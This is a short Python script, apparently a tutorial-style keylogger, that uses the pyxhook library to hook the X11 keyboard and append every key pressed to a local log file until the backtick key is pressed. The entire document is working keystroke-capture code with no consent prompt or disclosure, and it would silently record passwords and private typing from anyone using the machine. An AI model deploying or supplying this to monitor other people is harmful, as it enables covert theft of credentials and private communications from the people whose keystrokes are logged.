import pyxhook
#change this to your log file's path
log_file='/home/aman/xxx/file.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96:
    fob.close()
    new_hook.cancel()
#create a new hook manager instance
new_hook=pyxhook.HookManager()
#set KeyDown variable to function to execute when a key is pressed
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
#start the recording keys
new_hook.start()
